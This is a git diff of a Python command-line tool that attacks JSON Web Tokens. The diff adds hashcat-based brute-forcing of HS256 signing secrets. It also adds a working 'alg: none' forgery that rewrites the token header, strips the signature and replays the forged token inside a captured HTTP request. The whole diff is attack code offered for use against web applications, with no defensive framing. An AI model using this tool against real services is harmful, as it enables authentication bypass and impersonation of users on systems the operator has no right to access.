@@ -3,6 +3,8 @@ import subprocess
 import argparse
 import re
 import requests
+import base64 
+import json
 
 # Colors 
 RED = "\033[31m"
@@ -21,33 +23,47 @@ def displayHeader(header):
     for k,v in header.items():
         print(f"{YELLOW}{k:<10}{RESET} | {GREEN}{v:<10}{RESET}")
 
-
 def bruteforce(token, algorithm):
-
     if algorithm == 'None':
-        pass 
+        pass
 
     elif algorithm == 'HS256':
-        # Bruteforce HS256 
+        # Step 1: Run hashcat
         cmd = [
             "hashcat",
             "-a", "0",
             "-m", "16500",
             token,
-            "--quite",
-            "./jwtCommanlist/jwtFuzz.txt"
+            "./jwtCommanlist/",
+            "--quiet"
         ]
 
+        try:
+            subprocess.run(cmd, capture_output=True, text=True)
 
-        try: 
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            print(token)
-            print(result.stdout)
-        
+            # Step 2: Show cracked result
+            show_cmd = [
+                "hashcat",
+                "-m", "16500",
+                token,
+                "--show"
+            ]
+
+            result = subprocess.run(show_cmd, capture_output=True, text=True)
+            if result.stdout:
+                password = result.stdout.split(':',1)[1]
+            else :
+                password = '' 
+
+            print(f"{RESET}[+] Cracked result:{GREEN} ",end='')
+            print(password if result.stdout else f"{RED}No password found{RESET}")
+            print(RESET,end='')
         except Exception as e:
-            print(f"{RED}[-] Error during bruteforce: {e}{RESET}")
-    else : 
-        print('algorithm miss match')
+            print(f"[-] Error during bruteforce: {e}")
+
+    else:
+        print('algorithm mismatch')
+
 
 ## Get request from  files 
 def getRequestFromFile(httpRequestFile):
@@ -90,7 +106,11 @@ def buildRequest(rawRequest):
 
 
 def noneAlgattack(token):
-    pass
+    parts = token.split('.')
+    header = jwt.get_unverified_header(token)
+    header['alg'] = 'none'
+    newHeader = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+    return f"{newHeader}.{parts[1]}."
 
 
 def main():
@@ -106,7 +126,6 @@ def main():
 
     header = jwt.get_unverified_header(token)
 
-    algorithm = header.get('alg')
 
     
     # Handle data from file 
@@ -121,12 +140,22 @@ def main():
         tempRequest = re.sub(jwtRegex,f'{token}', rawRequest, count=1)
         buildRequest(tempRequest)
 
+        algorithm = header.get('alg')
+
+        noneToken = noneAlgattack(token)
+        print(noneToken)
+        tempRequest = re.sub(jwtRegex,f'{noneToken}', rawRequest, count=1)
+        buildRequest(tempRequest)
+
+
+
     else:
         displayHeader(header)
 
 
 
     if args.bruteforce:
+        algorithm = header.get('alg')
         bruteforce(token, algorithm)
 
 
